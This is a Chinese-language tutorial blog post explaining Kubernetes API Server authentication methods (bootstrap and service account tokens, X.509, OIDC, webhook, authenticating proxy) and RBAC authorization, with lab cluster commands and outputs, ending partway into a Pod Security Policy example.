    <title>Kubernetes API Server 认证与授权</title>
    <url>/Kubernetes-API-Server-%E8%AE%A4%E8%AF%81%E4%B8%8E%E6%8E%88%E6%9D%83/</url>
    <content><![CDATA[<blockquote>
<p>凡所有相，皆是虚妄。若见诸相非相，即见如来。</p>
</blockquote>
<p>了解Kubernetes API Server的认证与授权能让我们更清楚的了解Kubernetes的安全机制</p>
<span id="more"></span>

<h2 id="1-Bootstrap-Tokens认证"><a href="#1-Bootstrap-Tokens认证" class="headerlink" title="1. Bootstrap Tokens认证"></a>1. Bootstrap Tokens认证</h2><p>启动引导令牌是一种简单的持有者令牌（Bearer Token），这种令牌是在新建集群 或者在现有集群中添加新节点时使用的。 </p>
<p>启动引导令牌使用 <code>abcdef.0123456789abcdef</code> 的形式。 更加规范地说，它们必须符合正则表达式 <code>[a-z0-9]&#123;6&#125;\.[a-z0-9]&#123;16&#125;</code>。令牌的第一部分是 “Token ID”，它是一种公开信息，用于引用令牌并确保不会 泄露认证所使用的秘密信息。 第二部分是“令牌秘密（Token Secret）”，它应该被共享给受信的第三方。</p>
<p>启动引导令牌认证组件可以通过 API 服务器上的如下标志启用：</p>
<figure class="highlight gauss"><table><tr><td class="code"><pre><span class="line">--<span class="keyword">enable</span>-bootstrap-<span class="built_in">token</span>-auth</span><br></pre></td></tr></table></figure>

<p>我们可以在kube-apiserver.yaml文件中查看是否启用。</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line">[<span class="string">root@master</span> <span class="string">manifests</span>]<span class="comment"># cat /etc/kubernetes/manifests/kube-apiserver.yaml</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Pod</span></span><br><span class="line"><span class="string">......</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">containers:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">command:</span></span><br><span class="line">	<span class="string">.......</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">--enable-bootstrap-token-auth=true</span></span><br><span class="line">	<span class="string">.....</span></span><br><span class="line">  </span><br></pre></td></tr></table></figure>

<p>使用kubeadm查看Bearer Token</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@master manifests]<span class="comment"># kubeadm token create --print-join-command</span></span><br><span class="line">kubeadm join 172.16.42.100:6443 --token j37jxe.gjv3g740s4gw045p --discovery-token-ca-cert-hash sha256:7e243bc69c1465069c54fd05d7c09c16d7150b09be2598b34f7fae9d60ebc68f</span><br></pre></td></tr></table></figure>

<p>通过token访问api server(使用静态令牌访问需要添加Bearer)</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -k --header <span class="string">&quot;Authorization: Bearer fifuvj.jjqcsc3cmptk08aw&quot;</span> https://172.16.42.100:6443/api</span><br></pre></td></tr></table></figure>





<h2 id="2-服务账号令牌"><a href="#2-服务账号令牌" class="headerlink" title="2. 服务账号令牌"></a>2. 服务账号令牌</h2><p>服务账号令牌是Kubernetes默认启用的用户认证机制，</p>
<p>通过如下命令查看token</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@master manifests]<span class="comment"># kubectl describe secrets</span></span><br><span class="line">Name:         default-token-7xts4</span><br><span class="line">Namespace:    default</span><br><span class="line">Labels:       &lt;none&gt;</span><br><span class="line">Annotations:  kubernetes.io/service-account.name: default</span><br><span class="line">              kubernetes.io/service-account.uid: 720096c3-c0ea-4f03-889c-6d450ab62d2c</span><br><span class="line"></span><br><span class="line">Type:  kubernetes.io/service-account-token</span><br><span class="line"></span><br><span class="line">Data</span><br><span class="line">====</span><br><span class="line">ca.crt:     1066 bytes</span><br><span class="line">namespace:  7 bytes</span><br><span class="line">token:      eyJhbGciOiJSUzI1NiIsImtpZCI6IjVlYkx2aWRndzBVbm42VHYzQmNXaXdjdkl4cGZyWDFFd3l0aFBJY3pxNEkifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJkZWZhdWx0Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZWNyZXQubmFtZSI6ImRlZmF1bHQtdG9rZW4tN3h0czQiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC5uYW1lIjoiZGVmYXVsdCIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VydmljZS1hY2NvdW50LnVpZCI6IjcyMDA5NmMzLWMwZWEtNGYwMy04ODljLTZkNDUwYWI2MmQyYyIsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRlZmF1bHQifQ.sSEmxeJ2XIwb95t50ehRGvTUEOOQjjdTK5ula6AtgPV4z7m7YzpPKDSeQSauLWul272j9SLYyuiWR6rnoC4NvAgxgsAbapraJcyDjv0DadWUfbTcjLUSNGGaSQMuOyrYPA_ahK6UuFS_kAOiXL71gPLjE6xUcm8T4-aAgszUSG78OrMDmDao9ZoS2iD0TOVWNsxfUFw712meB4t2C5cj5DhfrDKdGLlJ4HRs3E0EYyPkX8NizaeSjifT-_AxFL7_KrL6GM4nMM8AEWoSn3v1N4CyQkvU5Bb2xu4hyZGX6OAWkcFNoMC4jEfeIgWbj6MC0elhuGYVznyr65GKtcjG</span><br></pre></td></tr></table></figure>

<p>同样的方法访问api server</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@master manifests]<span class="comment"># curl -k --header &quot;Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6IjVlYkx2aWRndzBVbm42VHYzQmNXaXdjdkl4cGZyWDFFd3l0aFBJY3pxNEkifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJkZWZhdWx0Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZWNyZXQubmFtZSI6ImRlZmF1bHQtdG9rZW4tN3h0czQiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC5uYW1lIjoiZGVmYXVsdCIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VydmljZS1hY2NvdW50LnVpZCI6IjcyMDA5NmMzLWMwZWEtNGYwMy04ODljLTZkNDUwYWI2MmQyYyIsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRlZmF1bHQifQ.sSEmxeJ2XIwb95t50ehRGvTUEOOQjjdTK5ula6AtgPV4z7m7YzpPKDSeQSauLWul272j9SLYyuiWR6rnoC4NvAgxgsAbapraJcyDjv0DadWUfbTcjLUSNGGaSQMuOyrYPA_ahK6UuFS_kAOiXL71gPLjE6xUcm8T4-aAgszUSG78OrMDmDao9ZoS2iD0TOVWNsxfUFw712meB4t2C5cj5DhfrDKdGLlJ4HRs3E0EYyPkX8NizaeSjifT-_AxFL7_KrL6GM4nMM8AEWoSn3v1N4CyQkvU5Bb2xu4hyZGX6OAWkcFNoMC4jEfeIgWbj6MC0elhuGYVznyr65GKtcjG6w&quot; https://172.16.42.100:6443/api</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;kind&quot;</span>: <span class="string">&quot;APIVersions&quot;</span>,</span><br><span class="line">  <span class="string">&quot;versions&quot;</span>: [</span><br><span class="line">    <span class="string">&quot;v1&quot;</span></span><br><span class="line">  ],</span><br><span class="line">  <span class="string">&quot;serverAddressByClientCIDRs&quot;</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="string">&quot;clientCIDR&quot;</span>: <span class="string">&quot;0.0.0.0/0&quot;</span>,</span><br><span class="line">      <span class="string">&quot;serverAddress&quot;</span>: <span class="string">&quot;172.16.42.100:6443&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br></pre></td></tr></table></figure>



<p><strong>创建一个 server account:</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#创建账号</span></span><br><span class="line">[root@master kubernetes]<span class="comment"># kubectl create serviceaccount jenkins</span></span><br><span class="line">serviceaccount/jenkins created</span><br><span class="line"></span><br><span class="line"><span class="comment">#查看账号信息</span></span><br><span class="line">[root@master kubernetes]<span class="comment"># kubectl get serviceaccounts jenkins -o yaml</span></span><br><span class="line">apiVersion: v1</span><br><span class="line">kind: ServiceAccount</span><br><span class="line">metadata:</span><br><span class="line">  creationTimestamp: <span class="string">&quot;2022-01-04T08:20:23Z&quot;</span></span><br><span class="line">  name: jenkins</span><br><span class="line">  namespace: default</span><br><span class="line">  resourceVersion: <span class="string">&quot;198784&quot;</span></span><br><span class="line">  uid: f3a618fa-07b5-42ed-af2e-17d1330d8dcd</span><br><span class="line">secrets:</span><br><span class="line">- name: jenkins-token-c2fll</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#查看该账号的token</span></span><br><span class="line">[root@master kubernetes]<span class="comment"># kubectl get secret jenkins-token-c2fll -o yaml</span></span><br><span class="line">apiVersion: v1</span><br><span class="line">data:</span><br><span class="line">  ca.crt: LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tCk1JSUM1ekNDQWMrZ0F3SUJBZ0lCQURBTkJna3Foa2lHOXcwQkFRc0ZBREFWTVJNd0VRWURWUVFERXdwcmRXSmwKY201bGRHVnpNQjRYRFRJeE1USXlOekEyTWpRMU1Gb1hEVE14TVRJeU5UQTJNalExTUZvd0ZURVRNQkVHQTFVRQpBeE1LYTNWaVpYSnVaWFJsY3pDQ0FTSXdEUVlKS29aSWh2Y05BUUVCQlFBRGdnRVBBRENDQVFvQ2dnRUJBS2xZCnJCTnF4S29FcGxIVVJFaHRGSkJENFRUNlRNamwyNFdrRGNObnhocnVwSVh3dXJJMzQxVi9ZN2hoRzBaSTFjeXAKcnFjVUNLMUlGQk1ZektLSnNrVE5nWG16WkZJUkFyNUtkSlI5RFQwWUt6MzY3dnUvYUsrU3ArUVRRQktQQ2ZORgpRd3VaZXkyYXAxRG5Ba1pQTWVZYlVzTHgwa1ljU2lBMitEbHNYdHdPRUtUSkNYVThKRHE1YXRPcVUxTXhPZVI0ClJqRFBLY0k3djBsV2xtdzFFSWlkTFA3aThFelhGcTVBUzA4R2gzZ2hSYyt2UHV6MWNhV29hOFBlVXBCWjZ0a0wKMU1aZlZvZVAvT1hmWVJDaURIY21LK05FSU0yWXFmVGI2NjlyODZyOFAzWnVTSko2a0pQdmd0YzdNZys2eWZiWgpzbGtrUzV4Q1YweHhwVkxLbTkwQ0F3RUFBYU5DTUVBd0RnWURWUjBQQVFIL0JBUURBZ0trTUE4R0ExVWRFd0VCCi93UUZNQU1CQWY4d0hRWURWUjBPQkJZRUZFemhQNXFNdG52Q2tzUmR6ZkkyRVpleHkzTjRNQTBHQ1NxR1NJYjMKRFFFQkN3VUFBNElCQVFCQmhqY1FFN0RFTFN6dkJFUDQ4c0pQVGNXUUVFT1dWT1lGUk9mUWNmNEk3VDhCY3BhRQowZXpGWi9HaXI4TXQwMFJFTHVGL3FpUElZR3BXOTYvMm5LK3RsQVdpRHBGOWhkTkRZdXlQWWpyd1V2TXl2eE5XCnViM2NaY1FmcGdab0FDWVZmUURJWXVMUGFDaDBNRmdzcnR4NmFDUWw5S3h4MnNIQ1lKcE9aZzRjOUtQNi9LSk0KTFhBT0tJeHpwbjg0cXR1N3ZLK0EwY2ZCd29VQUJwcGFqZlVHcVRocFlYLzhmSm51M3RoY01mMXN5NnVHeTdtMgp1bGNHWnpTdm9UME5ycGJ2RzR5ckZpcDRQYXdWRTgxYWI5VlhjN3pJUmJwM3B1YmlCalR1elJhZ1hQdUY4cmV0CkUyRVNXVGlESDZLcXVPU1UwNEt6dWJhbDNFaGVPQXhGekcySgotLS0tLUVORCBDRVJUSUZJQ0FURS0tLS0tCg==</span><br><span class="line">  namespace: ZGVmYXVsdA==</span><br><span class="line">  token: ZXlKaGJHY2lPaUpTVXpJMU5pSXNJbXRwWkNJNklqVmxZa3gyYVdSbmR6QlZibTQyVkhZelFtTlhhWGRqZGtsNGNHWnlXREZGZDNsMGFGQkpZM3B4TkVraWZRLmV5SnBjM01pT2lKcmRXSmxjbTVsZEdWekwzTmxjblpwWTJWaFkyTnZkVzUwSWl3aWEzVmlaWEp1WlhSbGN5NXBieTl6WlhKMmFXTmxZV05qYjNWdWRDOXVZVzFsYzNCaFkyVWlPaUprWldaaGRXeDBJaXdpYTNWaVpYSnVaWFJsY3k1cGJ5OXpaWEoyYVdObFlXTmpiM1Z1ZEM5elpXTnlaWFF1Ym1GdFpTSTZJbXBsYm10cGJuTXRkRzlyWlc0dFl6Sm1iR3dpTENKcmRXSmxjbTVsZEdWekxtbHZMM05sY25acFkyVmhZMk52ZFc1MEwzTmxjblpwWTJVdFlXTmpiM1Z1ZEM1dVlXMWxJam9pYW1WdWEybHVjeUlzSW10MVltVnlibVYwWlhNdWFXOHZjMlZ5ZG1salpXRmpZMjkxYm5RdmMyVnlkbWxqWlMxaFkyTnZkVzUwTG5WcFpDSTZJbVl6WVRZeE9HWmhMVEEzWWpVdE5ESmxaQzFoWmpKbExURTNaREV6TXpCa09HUmpaQ0lzSW5OMVlpSTZJbk41YzNSbGJUcHpaWEoyYVdObFlXTmpiM1Z1ZERwa1pXWmhkV3gwT21wbGJtdHBibk1pZlEuS3BWMlJ6M0RoWmRpQjJaNk9aWVVwVG9xOFJJc3VQWjFGbkp5RGpqSmluTjNkbHZxdl8tWUpob05wZm9vNkszUnRYNWRYczFkRnplNjZmYlJxbUJibHBGRVh0bXBtazNOM1hYZEFsdlhPWUpYRjU0b3JJTmliTncxUEZDcUZGY0k3ZFFEVWNpQkp2ZjJXUkhFZkZIb3JnUHNlOGFnbEpMdlpzMzdWWW1IZFJKWWQwMThhZW1wajhqZE5WdTNsWXJSQWoyMTNlQk1yemhxdHRyd2RNeVZFejBoVklBdE9MUE5QZ3pwRXFVSUp0Qm5rclVOb1BRNGFXUVlSWDM1eEdLTENGQUJNY3RmdEhHTE0zQlozby1yamx5X2tsdC1jcUdPcXdZSG0zc2ZzOXpYOG85Mm9BRkdDME9xeUQ1T2xLNmNoajNTbjd6UXRZTGhXaXI4R1dfNWhn</span><br><span class="line">	......</span><br><span class="line"></span><br><span class="line"><span class="comment">#删除该账号</span></span><br><span class="line">[root@master kubernetes]<span class="comment"># kubectl delete serviceaccount jenkins</span></span><br><span class="line">serviceaccount <span class="string">&quot;jenkins&quot;</span> deleted</span><br></pre></td></tr></table></figure>



<h2 id="3-X-509客户端"><a href="#3-X-509客户端" class="headerlink" title="3. X.509客户端"></a>3. X.509客户端</h2><p>X.509客户端证书也可称为HTTPS证书认证，是基于CA根证书签名的双向数字证书认证方式，默认情况下Kubernetes开启此参数配置。</p>
<p>与X.509客户端证书相关的三个kube-apiserver启动参数：</p>
<p>1）client-ca-file: 指定CA根证书文件，内置CA公钥</p>
<p>2）tls-private-key-file：API Server私钥文件位置</p>
<p>3）tls-cert-file：API Server证书文件</p>
<figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line">[root@master manifests]# cat <span class="regexp">/etc/</span>kubernetes<span class="regexp">/manifests/</span>kube-apiserver.yaml</span><br><span class="line">......</span><br><span class="line">spec:</span><br><span class="line">  containers:</span><br><span class="line">  - command:</span><br><span class="line">	........</span><br><span class="line">    - --client-ca-<span class="keyword">file</span>=<span class="regexp">/etc/</span>kubernetes<span class="regexp">/pki/</span>ca.crt</span><br><span class="line">    - --tls-cert-<span class="keyword">file</span>=<span class="regexp">/etc/</span>kubernetes<span class="regexp">/pki/</span>apiserver.crt</span><br><span class="line">    - --tls-<span class="keyword">private</span>-key-<span class="keyword">file</span>=<span class="regexp">/etc/</span>kubernetes<span class="regexp">/pki/</span>apiserver.key</span><br><span class="line">	......</span><br></pre></td></tr></table></figure>

<p>集群内部都是通过HTTPS证书互相访问，如果是集群外未配置证书的主机访问集群就会提示未授权访问。</p>
<h2 id="4-OpenID-Connect（OIDC）令牌"><a href="#4-OpenID-Connect（OIDC）令牌" class="headerlink" title="4. OpenID Connect（OIDC）令牌"></a>4. OpenID Connect（OIDC）令牌</h2><p><a href="https://openid.net/connect/">OpenID Connect</a> 是一种 OAuth2 认证方式， 被某些 OAuth2 提供者支持，例如 Azure 活动目录、Salesforce 和 Google。 协议对 OAuth2 的主要扩充体现在有一个附加字段会和访问令牌一起返回， 这一字段称作 <a href="https://openid.net/specs/openid-connect-core-1_0.html#IDToken">ID Token（ID 令牌）</a>。 ID 令牌是一种由服务器签名的 JSON Web 令牌（JWT），其中包含一些可预知的字段， 例如用户的邮箱地址，</p>
<p>要识别用户，身份认证组件使用 OAuth2 <a href="https://openid.net/specs/openid-connect-core-1_0.html#TokenResponse">令牌响应</a> 中的 <code>id_token</code>（而非 <code>access_token</code>）作为持有者令牌。 </p>
<p><img src="../images/pic/k8s12.jpg"></p>
<h2 id="5-Webhook-令牌身份认证"><a href="#5-Webhook-令牌身份认证" class="headerlink" title="5. Webhook 令牌身份认证"></a>5. Webhook 令牌身份认证</h2><p>Webhook 身份认证是一种用来验证持有者令牌的回调机制。</p>
<ul>
<li><code>--authentication-token-webhook-config-file</code> 指向一个配置文件，其中描述 如何访问远程的 Webhook 服务。</li>
<li><code>--authentication-token-webhook-cache-ttl</code> 用来设定身份认证决定的缓存时间。 默认时长为 2 分钟。</li>
</ul>
<p>下面是一个例子：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Kubernetes API 版本</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="comment"># API 对象类别</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Config</span></span><br><span class="line"><span class="comment"># clusters 指代远程服务</span></span><br><span class="line"><span class="attr">clusters:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">name-of-remote-authn-service</span></span><br><span class="line">    <span class="attr">cluster:</span></span><br><span class="line">      <span class="attr">certificate-authority:</span> <span class="string">/path/to/ca.pem</span>         <span class="comment"># 用来验证远程服务的 CA</span></span><br><span class="line">      <span class="attr">server:</span> <span class="string">https://authn.example.com/authenticate</span> <span class="comment"># 要查询的远程服务 URL。必须使用 &#x27;https&#x27;。</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># users 指代 API 服务的 Webhook 配置</span></span><br><span class="line"><span class="attr">users:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">name-of-api-server</span></span><br><span class="line">    <span class="attr">user:</span></span><br><span class="line">      <span class="attr">client-certificate:</span> <span class="string">/path/to/cert.pem</span> <span class="comment"># Webhook 插件要使用的证书</span></span><br><span class="line">      <span class="attr">client-key:</span> <span class="string">/path/to/key.pem</span>          <span class="comment"># 与证书匹配的密钥</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># kubeconfig 文件需要一个上下文（Context），此上下文用于本 API 服务器</span></span><br><span class="line"><span class="attr">current-context:</span> <span class="string">webhook</span></span><br><span class="line"><span class="attr">contexts:</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">context:</span></span><br><span class="line">    <span class="attr">cluster:</span> <span class="string">name-of-remote-authn-service</span></span><br><span class="line">    <span class="attr">user:</span> <span class="string">name-of-api-sever</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">webhook</span></span><br></pre></td></tr></table></figure>





<h2 id="6-身份认证代理"><a href="#6-身份认证代理" class="headerlink" title="6. 身份认证代理"></a>6. 身份认证代理</h2><p>API 服务器可以配置成从请求的头部字段值（如 <code>X-Remote-User</code>）中辩识用户。 这一设计是用来与某身份认证代理一起使用 API 服务器，代理负责设置请求的头部字段值。</p>
<ul>
<li><code>--requestheader-username-headers</code> 必需字段，大小写不敏感。用来设置要获得用户身份所要检查的头部字段名称列表（有序）。第一个包含数值的字段会被用来提取用户名。</li>
<li><code>--requestheader-group-headers</code> 可选字段，在 Kubernetes 1.6 版本以后支持，大小写不敏感。 建议设置为 “X-Remote-Group”。用来指定一组头部字段名称列表，以供检查用户所属的组名称。 所找到的全部头部字段的取值都会被用作用户组名。</li>
<li><code>--requestheader-extra-headers-prefix</code> 可选字段，在 Kubernetes 1.6 版本以后支持，大小写不敏感。 建议设置为 “X-Remote-Extra-“。用来设置一个头部字段的前缀字符串，API 服务器会基于所给 前缀来查找与用户有关的一些额外信息。这些额外信息通常用于所配置的鉴权插件。 API 服务器会将与所给前缀匹配的头部字段过滤出来，去掉其前缀部分，将剩余部分 转换为小写字符串并在必要时执行<a href="https://tools.ietf.org/html/rfc3986#section-2.1">百分号解码</a> 后，构造新的附加信息字段键名。原来的头部字段值直接作为附加信息字段的值。</li>
</ul>
<h2 id="7-API-Server授权"><a href="#7-API-Server授权" class="headerlink" title="7. API Server授权"></a>7. API Server授权</h2><p>Kubernetes包含四类授权模式：</p>
<ul>
<li>节点(Node)授权</li>
<li>基于属性的访问控制（Attribute-Based Access Control, ABAC)</li>
<li> 基于角色的访问控制（Role-Based Access Control, RBAC）</li>
<li>基于钩子（Webhook）方式的授权</li>
</ul>
<p>目前使用RBAC机制较多。</p>
<p>RBAC策略包含以下核心概念。</p>
<p>1）Resource: 指Kubernetes中的资源，如Pod、Service等。</p>
<p>2）Role: 对Resource执行的操作，如对Pod执行create、update、delete等操作。</p>
<p>3）Entity: 代表一个应用程序，可以是一个用户、组或服务账户</p>
<p>4）Role Binding: 将Role绑定到Entity，表明在指定Resource上运行某Entity并执行一组操作。</p>
<p>就Role和Role Binding而言，Kubernetes定义了两种范围类型：</p>
<p>1）集群范围：Cluster Role和Cluster Role Binding</p>
<p>2）命名空间范围：Role和Role Binding</p>
<p><strong>常用的命令：</strong></p>
<ol>
<li><p>查看所有命名空间的Cluster Role:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@master ~]<span class="comment"># kubectl get clusterroles --all-namespaces</span></span><br><span class="line">NAME                                                                   CREATED AT</span><br><span class="line">admin                                                                  2021-12-27T06:26:04Z</span><br><span class="line">calico-kube-controllers                                                2021-12-27T06:30:23Z</span><br><span class="line">calico-node                                                            2021-12-27T06:30:24Z</span><br><span class="line">cluster-admin                                                          2021-12-27T06:26:04Z</span><br><span class="line">edit                                                                   2021-12-27T06:26:04Z</span><br><span class="line">kubeadm:get-nodes                                                      2021-12-27T06:26:11Z</span><br><span class="line">kubernetes-dashboard                                                   2022-01-04T04:32:05Z</span><br><span class="line">system:aggregate-to-admin                                              2021-12-27T06:26:04Z</span><br><span class="line">.....</span><br></pre></td></tr></table></figure></li>
<li><p>查看所有命名空间的Role：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@master ~]<span class="comment"># kubectl get roles --all-namespaces</span></span><br><span class="line">NAMESPACE              NAME                                             CREATED AT</span><br><span class="line">kube-public            kubeadm:bootstrap-signer-clusterinfo             2021-12-27T06:26:11Z</span><br><span class="line">kube-public            system:controller:bootstrap-signer               2021-12-27T06:26:04Z</span><br><span class="line">kube-system            extension-apiserver-authentication-reader        2021-12-27T06:26:04Z</span><br><span class="line">kube-system            kube-proxy                                       2021-12-27T06:26:12Z</span><br><span class="line">kube-system            kubeadm:kubelet-config-1.21                      2021-12-27T06:26:05Z</span><br><span class="line">kube-system            kubeadm:nodes-kubeadm-config                     2021-12-27T06:26:05Z</span><br><span class="line">kube-system            system::leader-locking-kube-controller-manager   2021-12-27T06:26:0</span><br><span class="line">......</span><br></pre></td></tr></table></figure></li>
<li><p>查看预定义的Cluster Role对资源的访问权限</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@master ~]<span class="comment"># kubectl describe clusterrole view</span></span><br><span class="line">Name:         view</span><br><span class="line">Labels:       kubernetes.io/bootstrapping=rbac-defaults</span><br><span class="line">              rbac.authorization.k8s.io/aggregate-to-edit=<span class="literal">true</span></span><br><span class="line">Annotations:  rbac.authorization.kubernetes.io/autoupdate: <span class="literal">true</span></span><br><span class="line">PolicyRule:</span><br><span class="line">  Resources                                    Non-Resource URLs  Resource Names  Verbs</span><br><span class="line">  ---------                                    -----------------  --------------  -----</span><br><span class="line">  bindings                                     []                 []              [get list watch]</span><br><span class="line">  configmaps                                   []                 []              [get list watch]</span><br><span class="line">  ......</span><br></pre></td></tr></table></figure></li>
</ol>
<p><strong>案例：创建一个用例来处理特殊的资源</strong></p>
<p>1）为应用服务程序建立服务账户资源：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@master ~]<span class="comment"># kubectl create namespace coolapp</span></span><br><span class="line">namespace/coolapp created</span><br><span class="line">[root@master ~]<span class="comment"># kubectl --namespace=coolapp create serviceaccount myappid</span></span><br><span class="line">serviceaccount/myappid created</span><br></pre></td></tr></table></figure>

<p>2）创建role，该Role只能在coolapp命名空间中查看和列出Pod。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@master ~]<span class="comment"># kubectl --namespace=coolapp create role podview --verb=get --verb=list --resource=pods</span></span><br><span class="line">role.rbac.authorization.k8s.io/podview created</span><br><span class="line">[root@master ~]<span class="comment"># kubectl --namespace=coolapp describe role/podview</span></span><br><span class="line">Name:         podview</span><br><span class="line">Labels:       &lt;none&gt;</span><br><span class="line">Annotations:  &lt;none&gt;</span><br><span class="line">PolicyRule:</span><br><span class="line">  Resources  Non-Resource URLs  Resource Names  Verbs</span><br><span class="line">  ---------  -----------------  --------------  -----</span><br><span class="line">  pods       []                 []              [get list</span><br></pre></td></tr></table></figure>

<p>3）创建Role Binding，将Role “podview”绑定至名为myappid的应用程序中。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@master ~]<span class="comment"># kubectl --namespace=coolapp create rolebinding mypodviewer --role=podview --serviceaccount=coolapp:myappid</span></span><br><span class="line">rolebinding.rbac.authorization.k8s.io/mypodviewer created</span><br><span class="line">[root@master ~]<span class="comment"># kubectl --namespace=coolapp describe rolebinding/mypodviewer</span></span><br><span class="line">Name:         mypodviewer</span><br><span class="line">Labels:       &lt;none&gt;</span><br><span class="line">Annotations:  &lt;none&gt;</span><br><span class="line">Role:</span><br><span class="line">  Kind:  Role</span><br><span class="line">  Name:  podview</span><br><span class="line">Subjects:</span><br><span class="line">  Kind            Name     Namespace</span><br><span class="line">  ----            ----     ---------</span><br><span class="line">  ServiceAccount  myappid  coolapp</span><br></pre></td></tr></table></figure>

<p>通过以上部分完成了RBAC的创建，下面我们可以通过Kubectl验证myappid服务账户是否拥有对Pod资源的list权限。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@master ~]<span class="comment"># kubectl --namespace=coolapp auth can-i --as=system:serviceaccount:coolapp:myappid list pods</span></span><br><span class="line">yes</span><br></pre></td></tr></table></figure>

<p>再验证myappid服务账户是否拥有对Service资源的list权限：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@master ~]<span class="comment"># kubectl --namespace=coolapp auth can-i --as=system:serviceaccount:coolapp:myappid list services</span></span><br><span class="line">no</span><br></pre></td></tr></table></figure>



<h2 id="8-准入控制器"><a href="#8-准入控制器" class="headerlink" title="8. 准入控制器"></a>8. 准入控制器</h2><p>当用户请求通过了API Server认证和授权后，便进入了准入控制器环节，相比于前面的API Server 的认证与授权机制，准入控制器是更为细粒度的资源控制机制，其支持Kubernetes的许多高级功能，如Pod安全策略（Pod Security Policy）、安全上下文（Security Context）、服务账户（Service Account）等。</p>
<p>准入控制器主要分为两个阶段，第一个阶段运行变更准入控制器，第二个阶段运行验证准入控制器。变更准入控制器和验证准入控制器都是通过Webhook的方式进行实现</p>
<h3 id="8-1-Pod安全策略"><a href="#8-1-Pod安全策略" class="headerlink" title="8.1 Pod安全策略"></a>8.1 Pod安全策略</h3><p>Pod安全策略是集群级别的资源，主要在Pod的创建和更新阶段提供细粒度的权限控制，其在Kubernetes中被定义为一个准入控制器，集群管理员可通过kube-apiserver配置文件中指定”–enable-admission-plugins=NodeRestriction, PodSecurityPolicy”来完成启动。</p>
<p>Pod安全策略资源定义了一组Pod运行时必须遵守的条件及相关字段的默认值，只有Pod满足这些条件才会被Kubernetes接受。此外，Pod安全策略定义完成后，需要使用RBAC对其授权才能正常使用。</p>
<p><strong>案例演示：</strong></p>
<p>给api server添加psp权限</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">vim <span class="regexp">/etc/</span>kubernetes<span class="regexp">/manifests/</span>kube-apiserver.yaml </span><br></pre></td></tr></table></figure>

<p><img src="../images/pic/k8s13.jpg"> </p>
<p>为运行此示例，配置一个名字空间和一个服务账号。我们将用这个服务账号来 模拟一个非管理员账号的用户。</p>
<figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line">kubectl <span class="keyword">create</span> <span class="keyword">namespace</span> psp-example</span><br><span class="line">kubectl <span class="keyword">create</span> serviceaccount -n psp-example fake-<span class="keyword">user</span></span><br><span class="line">kubectl <span class="keyword">create</span> rolebinding -n psp-example fake-editor --clusterrole=edit --serviceaccount=psp-example:fake-<span class="keyword">user</span></span><br></pre></td></tr></table></figure>

<p>创建两个别名，以更清晰地展示我们所使用的用户账号，同时减少一些键盘输入：</p>
